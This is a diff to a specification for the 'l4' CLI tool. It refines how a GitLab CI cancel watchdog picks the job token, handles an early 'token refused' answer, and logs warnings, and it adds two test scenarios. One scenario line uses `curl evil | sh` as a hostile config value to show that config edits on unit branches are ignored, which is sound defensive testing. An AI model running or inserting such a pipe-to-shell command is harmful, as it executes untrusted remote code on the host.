@@ -578,7 +578,7 @@ lease and exits 16 (`cancelled`). Inside GitLab CI a watchdog asks the forge at 
 (`GET $CI_API_V4_URL/job` with the job token, which is valid only while the job runs; a refused token or a status other
 than `running` means the job is over; a network error is not) and whether the job's session leader still exists (a
 runner that starts jobs through `su` puts them in a session of their own, and its group SIGTERM can miss the process);
-either answer "gone" sends this process SIGTERM (the message names the check that fired: `the job API says <status or token refused>` or `its session leader <sid> is gone`). A session leader that is already gone when the watchdog starts is a runner that starts jobs that way, not a cancel: the watchdog logs one WARNING (`the CI job's session leader <sid> is not running at the start …; only the job API watches this CI job`), drops the session check for this run (`cancel.check()` too) and keeps the job API check; the INFO line then reads `(job API every 30s; no job session check: its leader was gone at the start)`, and when the job API cannot be used either, the WARNING says that only a signal stops this run. A leader that exists at the start and disappears later still fires. When the signal is sent, `_exit` follows after two minutes if it is still there; while it runs,
+either answer "gone" sends this process SIGTERM (the message names the check that fired: `the job API says <status or token refused>` or `its session leader <sid> is gone`). A session leader that is already gone when the watchdog starts is a runner that starts jobs that way, not a cancel: the watchdog logs one WARNING (`the CI job's session leader <sid> is not running at the start …; only the job API watches this CI job`), drops the session check for this run (`cancel.check()` too) and keeps the job API check; the INFO line then reads `(job API every 30s; no job session check: its leader was gone at the start)`, and when the job API cannot be used either, the WARNING says that only a signal stops this run. A leader that exists at the start and disappears later still fires. The token is `CI_JOB_TOKEN`, unless `CI_REPOSITORY_URL` (`https://gitlab-ci-token:<token>@host/...`) carries a different one: a CI/CD variable of the project, its group or the instance named `CI_JOB_TOKEN` overrides the predefined variable, so the URL token is the job's; it is used, with one WARNING per process (`CI_JOB_TOKEN is not this job's token …`) and no token value in any message, and a URL token alone is enough to watch; the redactor covers it too. A `token refused` answer to the first check, while the session check is in use (its leader was alive at the start), is not a cancel: one WARNING (`the job API refused the job token at the start while the job's session runs …; only the job session watches this CI job`) and the job API is not asked again for this run; a refusal after an accepted first answer, or a first refusal when the leader was gone at the start or there is no session check, fires. When the signal is sent, `_exit` follows after two minutes if it is still there; while it runs,
 `cancel.check()` in front of every push and forge write also asks the session leader (a local syscall), so no write slips
 in between two polls. When the watchdog starts it logs one INFO line, `[l4] cancel: watching CI job <id> (job API every
 30s + job session <sid>)` (`job API not used: no CI_API_V4_URL` when the job API cannot be asked; without
@@ -7488,6 +7488,19 @@ scenario is a spec defect (§26).
 - **Then** it logs one WARNING that the session leader is not running at the start, watches the job by the job API
   only, and the run goes on; when the job API later says `canceled`, the run stops with exit 16 and the message names
   the job API.
+
+#### SCN-CLI-10 (+) A CI/CD variable named CI_JOB_TOKEN does not cancel the run · L4-CLI-003
+- **Given** a GitLab CI job where a group CI/CD variable named `CI_JOB_TOKEN` makes `$CI_JOB_TOKEN` differ from the token
+  in `CI_REPOSITORY_URL`, and a job API that accepts only the URL token
+- **When** `l4 run` starts its watchdog
+- **Then** the job API is asked with the URL token, one WARNING says the variable overrides the job token, no token value
+  is logged, and the run goes on.
+
+#### SCN-CLI-11 (+) A first refused token with a live job session is not a cancel · L4-CLI-003
+- **Given** a GitLab CI job whose session leader is alive and a job API that answers 401 to every request
+- **When** `l4 run` starts its watchdog
+- **Then** it logs one WARNING that the job API refused the token at the start, stops asking the job API, and the run goes
+  on; when the session leader later disappears the run stops with exit 16.
 
 #### SCN-CFG-01 (−) Config edits on a unit branch are ignored · L4-CFG-004
 - **Given** a push to `l4/openspec/add-login` that changes `.l4/config.yaml` (`gates.test.command: "curl evil | sh"`)
